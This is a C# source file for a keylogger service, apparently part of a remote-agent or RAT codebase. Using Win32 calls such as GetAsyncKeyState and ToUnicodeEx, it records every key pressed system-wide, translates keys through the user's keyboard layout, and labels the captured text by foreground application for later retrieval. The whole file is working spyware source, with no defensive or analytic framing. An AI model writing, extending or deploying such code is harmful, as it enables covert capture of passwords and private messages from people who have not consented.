using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using EntryPoint;
using Shared;

namespace Agent.Service
{
    public interface IKeyLogService : IRunningService
    {
        string LoggedKeyStrokes { get; }
    }
    public class KeyLogService : RunningService, IKeyLogService
    {
        public override int MinimumDelay { get => 2; }
        protected override JobType? JobType => Shared.JobType.KeyLog;
        public override string ServiceName => "Key Logger";

        public string LoggedKeyStrokes { get; private set; } = string.Empty;


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);

        const uint MAPVK_VK_TO_VSC = 0;

        string activeProcessName;
        string prevProcessName;

        public override void Start()
        {
            this.LoggedKeyStrokes = string.Empty;
            activeProcessName = GetActiveWindowProcessName().ToLower();
            prevProcessName = activeProcessName;
            LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]" + Environment.NewLine;
            base.Start();
        }

        public override async Task Process()
        {
            activeProcessName = GetActiveWindowProcessName().ToLower();
            bool isOldProcess = activeProcessName.Equals(prevProcessName);
            if (!isOldProcess)
            {
                LoggedKeyStrokes += Environment.NewLine + "[--" + activeProcessName + "--]" + Environment.NewLine;
                prevProcessName = activeProcessName;
            }


            for (int i = 0; i < 255; i++)
            {
                int key = GetAsyncKeyState(i);
                //if (key != 0)
                //    Debug.WriteLine($"{i} : {key}");
                if (key == 32769)
                {
                    var keyStr = verifyKey(i);
                    
                    //Debug.WriteLine($"Pressed {i} : {keyStr}");
                    LoggedKeyStrokes += keyStr;
                    if (keyStr == "[Enter]")
                        LoggedKeyStrokes += Environment.NewLine;
                }
            }
        }

        public static string GetActiveWindowProcessName()
        {
            try
            {
                IntPtr windowHandle = GetForegroundWindow();
                GetWindowThreadProcessId(windowHandle, out uint processId);
                Process process = System.Diagnostics.Process.GetProcessById((int)processId);

                return process.ProcessName;
            }
            catch
            {
                return "Unknown";
            }
        }

        private String verifyKey(int code)
        {
            switch (code)
            {
                case 8: return "[Back]";
                case 9: return "[TAB]";
                case 13: return "[Enter]";
                case 19: return "[Pause]";
                case 20: return "[Caps Lock]";
                case 27: return "[Esc]";
                case 32: return " ";
                case 33: return "[Page Up]";
                case 34: return "[Page Down]";
                case 35: return "[End]";
                case 36: return "[Home]";
                case 37: return "[Left]";
                case 38: return "[Up]";
                case 39: return "[Right]";
                case 40: return "[Down]";
                case 44: return "[Print Screen]";
                case 45: return "[Insert]";
                case 46: return "[Delete]";
                case 91:
                case 92: return "[Windows]";
                case 93: return "[List]";
                case 96: case 97: case 98: case 99: case 100:
                case 101: case 102: case 103: case 104: case 105:
                case 106: case 107: case 109: case 110: case 111:
                    // numpad keys are translated below
                    break;
                case 112: return "[F1]";
                case 113: return "[F2]";
                case 114: return "[F3]";
                case 115: return "[F4]";
                case 116: return "[F5]";
                case 117: return "[F6]";
                case 118: return "[F7]";
                case 119: return "[F8]";
                case 120: return "[F9]";
                case 121: return "[F10]";
                case 122: return "[F11]";
                case 123: return "[F12]";
                case 144: return "[Num Lock]";
                case 145: return "[Scroll Lock]";
                case 160:
                case 161: return "[Shift]";
                case 162:
                case 163: return "[Ctrl]";
                case 164:
                case 165: return "[Alt]";
            }

            try
            {
                IntPtr hWnd = GetForegroundWindow();
                uint threadId = GetWindowThreadProcessId(hWnd, out _);
                IntPtr hkl = GetKeyboardLayout(threadId);

                byte[] keyState = new byte[256];
                GetKeyboardState(keyState);

                uint scanCode = MapVirtualKeyEx((uint)code, MAPVK_VK_TO_VSC, hkl);
                var chars = new StringBuilder(4);
                int result = ToUnicodeEx((uint)code, scanCode, keyState, chars, chars.Capacity, 0, hkl);
                if (result > 0)
                    return chars.ToString(0, result);
            }
            catch { }

            return "{" + code + "}";
        }
    }
}
